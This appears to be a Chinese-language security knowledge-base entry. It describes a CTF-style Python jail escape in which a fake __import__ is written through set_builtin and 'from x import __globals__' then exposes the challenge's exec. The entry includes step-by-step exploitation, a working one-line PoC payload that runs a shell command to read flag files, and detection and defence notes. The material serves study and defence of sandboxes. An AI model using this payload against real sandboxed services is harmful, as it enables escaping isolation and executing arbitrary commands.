---
id: binary-pwn-sandbox-escape-python-set-builtin-fake-import-globals
title: builtins 被清空后用 set_builtin 伪造 __import__，from-import 取函数 __globals__ 逃逸
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-jail-set-builtin-fake-import
aliases:
- build-a-builtin
- set_builtin 逃逸
- 伪造 __import__
- from x import __globals__
- 禁点号 pyjail
tags:
- python
- pyjail
- sandbox-escape
- builtins
- import-hook
- globals
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:11:12+08:00'
  notes: 已对照原文 build-a-builtin 段核对：builtins.__dict__.clear()、set_builtin 可写 builtins、伪造 __import__ + from x import __globals__ as g、\x2e 二次绕过、__loader__.get_data.__globals__['_os'] 链均一致；未在远端复跑。
---

## 一句话结论

沙箱清空 `builtins.__dict__`、只留下 `set_builtin(key,val)` 往 builtins 写值并禁止输入中出现点号时，可以先把 `__import__` 伪造成返回 `set_builtin` 自身的 lambda，再用 `from x import __globals__ as g` 让 import 机制去读这个函数的 `__globals__`，从而拿到 chall.py 的全局字典与其中保留的 `exec`，最终逃逸。

## 原理

- `exec(code, {"set_builtin": set_builtin}, {})` 让用户代码的 globals 只有 `set_builtin`；但函数对象自带 `__globals__`，指向其定义模块（chall.py）的全局命名空间。
- 不能写 `set_builtin.__globals__`，因为输入过滤禁止 `.`。
- Python 的 `from x import y` 语句在字节码层会调用 `__import__('x', ..., ('y',), ...)`，然后对返回对象取属性 `y`。因此：
  - 先 `set_builtin('__import__', lambda *a: set_builtin)` 把假 import 写入 builtins；
  - 再 `from x import __globals__ as g`，解释器调用假 import 得到 `set_builtin`，再取 `set_builtin.__globals__`，绑定为 `g`。
- chall.py 中保留了 `exec = exec`，所以 `g['exec']` 可用；第二阶段的字符串里可以用 `\x2e` 表示点号，绕过“只检查首次输入”的过滤。
- 拿到 `g` 后还可取 `__loader__`、`__builtins__` 等；文章用 `g['__loader__'].__class__.get_data.__globals__['_os'].system(...)` 直接执行命令。

## 触发条件

- Python jail 清空 builtins，但保留一个可写 builtins 的函数（如 `set_builtin`）。
- 输入只过滤 `.`（或只过滤首层源码），且允许 `from ... import ...`、lambda、字符串。
- exec 的 globals 中保留了 `exec` 或其他可用对象。

## 利用步骤

1. 用 `set_builtin('__import__', lambda *a: set_builtin)` 覆盖 builtins 中的 `__import__`。
2. 用 `from x import __globals__ as g` 触发假 import，取得 `set_builtin.__globals__`。
3. 用 `g['exec']("第二阶段代码")` 执行任意代码；第二阶段用 `\x2e` 代替点号。
4. 第二阶段链：`g['__loader__'].__class__.get_data.__globals__['_os'].system('sh -c "cat /flag-*"')`。

## PoC

```python
payload = r"""set_builtin('__import__',lambda *a:set_builtin);from x import __globals__ as g;g['exec']("g['__loader__']\x2e__class__\x2eget_data\x2e__globals__['_os']\x2esystem('sh -c \"cat /flag-*\"')")"""
assert "." not in payload and "\n" not in payload
```

## 变体与关联

- 用 `__builtins__`、`__loader__`、`catch_warnings` 等其他带 `__globals__` 的对象替代 `__loader__` 链。
- 若过滤的是其他字符，可继续用 `\xNN`、八进制或 `chr()` 拼接。
- 关联：[[binary-pwn-sandbox-escape-python-eo-blacklist-octal-subprocess]]（字符黑名单 + 八进制）、[[binary-pwn-sandbox-escape-python-builtins-none-list-dict-alias]]（builtins 置 None 的恢复）。

## 检测与防御

- 检测：输入中出现 `set_builtin('__import__'`、`from ... import __globals__`、`\x2e`、`__loader__`、`get_data`、`_os`。
- 防御：不要向用户暴露可写 builtins 的函数；用 AST 白名单/受限解释器；进程级隔离；清空 builtins 后同时移除 `exec`/`__loader__` 等可利用对象。
